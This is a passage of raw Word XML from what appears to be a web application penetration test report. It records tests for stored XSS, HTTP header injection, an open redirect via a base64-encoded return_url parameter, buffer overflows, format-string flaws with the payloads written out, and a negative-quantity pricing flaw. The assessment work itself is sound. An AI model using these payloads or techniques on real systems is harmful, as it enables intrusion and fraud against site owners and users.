            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F97DDBA" w14:textId="2E923169" w:rsidR="00911FEB" w:rsidRDefault="00E85811" w:rsidP="00BB339B">
      <w:r>
        <w:t>This form of XSS differs from that seen on the contact u</w:t>
      </w:r>
      <w:r w:rsidR="007C3AFD">
        <w:t>s page, as it is stored XSS. This means</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that every time the customer details page is loaded up, the script will run again.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397E43F7" w14:textId="6CED5B7C" w:rsidR="00B75338" w:rsidRDefault="00B75338" w:rsidP="00BB339B">
      <w:r>
        <w:t>Testing for user redirection was also tested on this page</w:t>
      </w:r>
      <w:r w:rsidR="00B372B0">
        <w:t xml:space="preserve"> using the same script as previous</w:t>
      </w:r>
      <w:r w:rsidR="006B3E37">
        <w:t>ly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. However, when the admin logs in they are not redirected to another webpage. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Thus</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> meaning that t</w:t>
      </w:r>
      <w:r w:rsidR="006B3E37">
        <w:t>he user redirection script failed</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DB9A0F" w14:textId="77777777" w:rsidR="00B11DF0" w:rsidRDefault="00B11DF0" w:rsidP="00BB339B"/>
    <w:p w14:paraId="2AF4B2E9" w14:textId="77777777" w:rsidR="00B75338" w:rsidRDefault="00B75338" w:rsidP="00BB339B"/>
    <w:p w14:paraId="20B97CAD" w14:textId="3BB3BE9D" w:rsidR="00911FEB" w:rsidRDefault="008F3579" w:rsidP="00DE3E0E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="_Toc531104353"/>
      <w:r>
        <w:t xml:space="preserve">Test for </w:t>
      </w:r>
      <w:r w:rsidR="00DE3E0E">
        <w:t>HTTP Header injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
      <w:r w:rsidR="00DE3E0E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A46BAB" w14:textId="30F55587" w:rsidR="008F3579" w:rsidRDefault="008F3579" w:rsidP="008F3579">
      <w:r>
        <w:t>After submitting a fo</w:t>
      </w:r>
      <w:r w:rsidR="00B47238">
        <w:t xml:space="preserve">rm in the “contact us” page, the </w:t>
      </w:r>
      <w:r>
        <w:t>application redirects the user to a page that displays a thank you message, along with the name enter</w:t>
      </w:r>
      <w:r w:rsidR="00B47238">
        <w:t>ed o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n the contact page. This could potentially provide a platform for HTTP header injections. In the name field of the contact page, the string “UhOh%0%d </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>String:Injected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">” was inserted, and the headers that followed were intercepted. If the </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>injection worked successfully, then there should be a line in the header displaying “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>String:Injected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">” Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>33</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shows the header for </w:t>
      </w:r>
      <w:r w:rsidR="005A7369">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">request. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70482687" w14:textId="77777777" w:rsidR="008F3579" w:rsidRDefault="008F3579" w:rsidP="008F3579">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1ED0131D" wp14:editId="34FA9033">
            <wp:extent cx="5943600" cy="13950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395095"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="745A8A87" w14:textId="4D5DADA7" w:rsidR="008F3579" w:rsidRDefault="008F3579" w:rsidP="008F3579">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>33</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - HTTP Header Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E770310" w14:textId="47099D8F" w:rsidR="006B3E37" w:rsidRDefault="005A7369" w:rsidP="008F3579">
      <w:r>
        <w:t>From the results</w:t>
      </w:r>
      <w:r w:rsidR="008F3579">
        <w:t xml:space="preserve"> it is evident that t</w:t>
      </w:r>
      <w:r w:rsidR="006B3E37">
        <w:t>he injection failed, and no new</w:t>
      </w:r>
      <w:r w:rsidR="008F3579">
        <w:t xml:space="preserve"> li</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nes were created in the header, meaning </w:t>
      </w:r>
      <w:r w:rsidR="008F3579">
        <w:t xml:space="preserve">that the page is not vulnerable to header Injections. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40190284" w14:textId="2FD147B3" w:rsidR="008F3579" w:rsidRDefault="00A862A7" w:rsidP="00A862A7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="35" w:name="_Toc531104354"/>
      <w:r>
        <w:t>Test for Open Redirection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="35"/>
    </w:p>
    <w:p w14:paraId="0AB87C37" w14:textId="338AC143" w:rsidR="00030626" w:rsidRPr="00030626" w:rsidRDefault="00030626" w:rsidP="00030626">
      <w:r>
        <w:t>There are two functions on the webpage that use a “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>return_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>” parameter in the h</w:t>
      </w:r>
      <w:r w:rsidR="005A7369">
        <w:t>eader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. These are the add to cart function, and the clear cart function. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1D0F3E" w14:textId="51793389" w:rsidR="000D1D54" w:rsidRDefault="00BD08BA" w:rsidP="00A862A7">
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>34</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shows the return URL </w:t>
      </w:r>
      <w:r w:rsidR="00030626">
        <w:t>being captured when the clear cart function is called</w:t>
      </w:r>
      <w:r w:rsidR="000D1D54">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F093A8E" w14:textId="6AE61C19" w:rsidR="000D1D54" w:rsidRDefault="000D1D54" w:rsidP="000D1D54">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7CF04133" wp14:editId="431B7581">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1876425</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>13336</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2257425" cy="13335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22574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CD6EAB" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA689B" w:rsidP="009224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04133" id="Rectangle 39" o:spid="_x0000_s1028" style="position:absolute;margin-left:147.75pt;margin-top:1.05pt;width:177.75pt;height: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" filled="f" strokecolor="red" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="6BCD6EAB" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA689B" w:rsidP="00922467">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00030626">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="18D0EA8A" wp14:editId="01AA998F">
            <wp:extent cx="4724400" cy="1314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24400" cy="1314450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="101815D5" w14:textId="7CB5A988" w:rsidR="000D1D54" w:rsidRDefault="000D1D54" w:rsidP="000D1D54">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>34</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - URL Redirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA29F13" w14:textId="16CC4246" w:rsidR="00A862A7" w:rsidRDefault="00BD08BA" w:rsidP="00A862A7">
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000D1D54">
        <w:t xml:space="preserve">The “=” </w:t>
      </w:r>
      <w:r w:rsidR="00030626">
        <w:t>sign at the end indicates that this string is base 64 encoded.</w:t>
      </w:r>
      <w:r w:rsidR="000D1D54">
        <w:t xml:space="preserve"> After entering the URL into a base 64 decoder, the </w:t>
      </w:r>
      <w:r w:rsidR="00030626">
        <w:t xml:space="preserve">string </w:t>
      </w:r>
      <w:r w:rsidR="005A7369">
        <w:t>translated in</w:t>
      </w:r>
      <w:r w:rsidR="00030626">
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidR="000D1D54">
        <w:t xml:space="preserve"> “</w:t>
      </w:r>
      <w:r w:rsidR="000D1D54" w:rsidRPr="000D1D54">
        <w:t>http://192.168.1.10/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000D1D54" w:rsidRPr="000D1D54">
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000D1D54">
        <w:t xml:space="preserve">”. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459BD02B" w14:textId="63D270D0" w:rsidR="00DE3E0E" w:rsidRDefault="000D1D54" w:rsidP="00DE3E0E">
      <w:r>
        <w:t>If this header is intercepted and</w:t>
      </w:r>
      <w:r w:rsidR="005A7369">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="005A7369">
        <w:t>return_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005A7369">
        <w:t xml:space="preserve"> parameter is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> changed to a base 64 encoded version of the URL </w:t>
      </w:r>
      <w:r w:rsidR="005A7369">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="00030626" w:rsidRPr="00030626">
        <w:t>https://www.google.co.uk/?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00030626" w:rsidRPr="00030626">
        <w:t>gws_rd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00030626" w:rsidRPr="00030626">
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00030626" w:rsidRPr="00030626">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005A7369">
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t>, then the websi</w:t>
      </w:r>
      <w:r w:rsidR="00030626">
        <w:t>te redirects the user to the google homepage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79647C84" w14:textId="5CF8AF95" w:rsidR="00030626" w:rsidRDefault="00030626" w:rsidP="00DE3E0E">
      <w:r>
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r w:rsidR="005A7369">
        <w:t>redirection could</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> be used for a malicious attacker to target a user and redirect them to a webpage of their choosing, which can </w:t>
      </w:r>
      <w:r w:rsidR="003264CE">
        <w:t xml:space="preserve">then </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">be used to further exploit the user. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7CF621" w14:textId="373155B5" w:rsidR="000C2BAB" w:rsidRDefault="000C2BAB" w:rsidP="007975C2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="_Toc531104355"/>
      <w:r>
        <w:t>Tes</w:t>
      </w:r>
      <w:r w:rsidR="007975C2">
        <w:t>t for Function-Specific Input Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="36"/>
    </w:p>
    <w:p w14:paraId="7AB1E348" w14:textId="23FC040E" w:rsidR="007975C2" w:rsidRDefault="00021B17" w:rsidP="00021B17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="_Toc531104356"/>
      <w:r>
        <w:t>Test for Buffer Overflows</w:t>
      </w:r>
      <w:bookmarkEnd w:id="37"/>
    </w:p>
    <w:p w14:paraId="516952D4" w14:textId="4DB53247" w:rsidR="00021B17" w:rsidRDefault="00021B17" w:rsidP="00021B17">
      <w:r>
        <w:t xml:space="preserve">Using Burp Intruder, all pages that allow user input were tested for buffer overflow vulnerabilities. </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t>Ten thousand ‘A’</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> characters were entered individually into each parameter </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r w:rsidR="006B3E37">
        <w:t>each</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t xml:space="preserve"> request, with the aim of </w:t>
      </w:r>
      <w:r w:rsidR="006B3E37">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">making </w:t>
      </w:r>
      <w:r w:rsidR="003264CE">
        <w:t>the system throw</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t xml:space="preserve"> an unexpected error.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> However, no anomalies were </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t>found,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> an</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t>d the system handled all the requests</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> normally.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76BD1A96" w14:textId="4B3A40C9" w:rsidR="00F163E2" w:rsidRDefault="00021B17" w:rsidP="00021B17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="38" w:name="_Toc531104357"/>
      <w:r>
        <w:t>Test for Format String Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="38"/>
    </w:p>
    <w:p w14:paraId="3A935FF0" w14:textId="7D038F77" w:rsidR="00F163E2" w:rsidRDefault="00F163E2" w:rsidP="00021B17">
      <w:r>
        <w:t>Using Burp Intruder, the following strings were inserted as payloads:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F861F0" w14:textId="447AEAED" w:rsidR="00021B17" w:rsidRDefault="00021B17" w:rsidP="00F163E2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00021B17">
        <w:t>%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%0A%0A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13CA24DA" w14:textId="77777777" w:rsidR="00735A68" w:rsidRPr="00735A68" w:rsidRDefault="00735A68" w:rsidP="00F163E2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00735A68">
        <w:t>%0A%0A%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%0A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3740A1BC" w14:textId="2BEE1D3F" w:rsidR="00021B17" w:rsidRDefault="00735A68" w:rsidP="00F163E2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00735A68">
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00735A68">
        <w:t>251!n</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00735A68">
        <w:t>%252!n%253!n%254!n%255!n%256!n%257!n%258!n%259!n%2510!n%0A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62735F67" w14:textId="0068D417" w:rsidR="00021B17" w:rsidRDefault="00735A68" w:rsidP="00F163E2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00735A68">
        <w:t>%0A%</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00735A68">
        <w:t>251!s</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00735A68">
        <w:t>%252!s%253!s%254!s%255!s%256!s%257!s%258!s%259!s%2510!s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509D172C" w14:textId="71163B2E" w:rsidR="003264CE" w:rsidRDefault="003264CE" w:rsidP="003264CE">
      <w:r>
        <w:t>The aim of this was to find any anomalies in the response from the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DF0626" w14:textId="74D9B294" w:rsidR="00F163E2" w:rsidRDefault="00F163E2" w:rsidP="00F163E2">
      <w:r>
        <w:t>After examining all of the outputs, no format st</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t>ring vulnerabilities were found,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the applicat</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t>ion processed all of the requests as expected</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E76A25" w14:textId="4C30CC0E" w:rsidR="00117BFD" w:rsidRDefault="00117BFD" w:rsidP="00117BFD">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc531104358"/>
      <w:r>
        <w:t>Other tests</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/>
    </w:p>
    <w:p w14:paraId="07110F74" w14:textId="5DD9780B" w:rsidR="00117BFD" w:rsidRPr="00117BFD" w:rsidRDefault="00117BFD" w:rsidP="00117BFD">
      <w:r>
        <w:t>A large amount of testing does not need to be carried out due to the application using a limited amount of technology. Testing</w:t>
      </w:r>
      <w:r w:rsidR="007C2096">
        <w:t xml:space="preserve"> for SOAP, LDAP, XPath</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and XXE injection will not be carried out </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t>as</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> there </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> no evidence of these vulnerabilities being present. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3419B6" w14:textId="7D8FA143" w:rsidR="00F163E2" w:rsidRDefault="007747F6" w:rsidP="007747F6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="40" w:name="_Toc531104359"/>
      <w:r>
        <w:t>Test for Logic Flaws</w:t>
      </w:r>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p w14:paraId="0A2A8705" w14:textId="28DC483D" w:rsidR="007747F6" w:rsidRPr="007747F6" w:rsidRDefault="007747F6" w:rsidP="007747F6">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="_Toc531104360"/>
      <w:r>
        <w:t>Identify the Key Attack Surface</w:t>
      </w:r>
      <w:bookmarkEnd w:id="41"/>
    </w:p>
    <w:p w14:paraId="7ED1162B" w14:textId="143F2170" w:rsidR="00CE60F1" w:rsidRDefault="00CE60F1" w:rsidP="007747F6">
      <w:r>
        <w:t xml:space="preserve">The main areas that logic flaws can be found are in multistage processes and critical security functions. The only multistage process that is present in the application is when the user is purchasing a product. During this process, the user has to undertake a specific series of actions. </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">There are two areas that would be classed as employing critical security functions. These functions are the login function, and the change password function. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F347627" w14:textId="0FC0B115" w:rsidR="007A3A59" w:rsidRDefault="007A3A59" w:rsidP="007A3A59">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="42" w:name="_Toc531104361"/>
      <w:r>
        <w:t>Test Multistage Processes</w:t>
      </w:r>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w14:paraId="6E5634B7" w14:textId="3F36571A" w:rsidR="007A3A59" w:rsidRDefault="00CE60F1" w:rsidP="007A3A59">
      <w:r>
        <w:t xml:space="preserve">In order for the user to purchase a product, they must undertake a specific series of actions. </w:t>
      </w:r>
      <w:r w:rsidR="00EB3C64">
        <w:t xml:space="preserve">The process involved for buying a product involves adding </w:t>
      </w:r>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:r w:rsidR="00EB3C64">
        <w:t xml:space="preserve"> item to the cart,</w:t>
      </w:r>
      <w:r w:rsidR="00C607C0">
        <w:t xml:space="preserve"> going to the checkout page, then</w:t>
      </w:r>
      <w:r w:rsidR="00EB3C64">
        <w:t xml:space="preserve"> filling </w:t>
      </w:r>
      <w:r w:rsidR="00C607C0">
        <w:t>out the personal details on the confirm purchase page</w:t>
      </w:r>
      <w:r w:rsidR="00EB3C64">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C3346E" w14:textId="50D6AF80" w:rsidR="00CE60F1" w:rsidRDefault="00CE60F1" w:rsidP="007A3A59">
      <w:r>
        <w:t>After testing, it was found that the input fields</w:t>
      </w:r>
      <w:r w:rsidR="00C607C0">
        <w:t xml:space="preserve"> for the product quantities</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the </w:t>
      </w:r>
      <w:r w:rsidR="00C607C0">
        <w:t>home</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> page do not validate the data that is being entered. Strings were entered into the input fields, with the expectation of the application throwing an error. However, these strings were accepted as valid</w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve"> input.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve">When negative integers were entered, the application should </w:t>
      </w:r>
      <w:r w:rsidR="000878BC">
        <w:t>throw</w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve"> an error message. However, no error message was displayed, and instead the numbers are processed successfully, and the price is taken off the over total. T</w:t>
      </w:r>
      <w:r w:rsidR="00C607C0">
        <w:t xml:space="preserve">his can be seen in </w:t>
      </w:r>
      <w:r w:rsidR="000878BC">
        <w:t>Figure</w:t>
      </w:r>
      <w:r w:rsidR="00C607C0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>35</w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBEBC2D" w14:textId="77777777" w:rsidR="00D0059A" w:rsidRDefault="00D0059A" w:rsidP="00D0059A">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="689ECCE0" wp14:editId="08D1A113">
            <wp:extent cx="2238375" cy="2105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38375" cy="2105025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="041C47FE" w14:textId="5C1B4C64" w:rsidR="00D0059A" w:rsidRDefault="00D0059A" w:rsidP="00D0059A">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>35</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Negative Input</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D869F19" w14:textId="4B0DE92A" w:rsidR="00D0059A" w:rsidRDefault="00D57FCB" w:rsidP="00D0059A">
      <w:r>
        <w:t xml:space="preserve">If the process page is called before any items have been ordered, then the user can fill out their details as if they are still ordering a product. Every field </w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve">within the ordering </w:t>
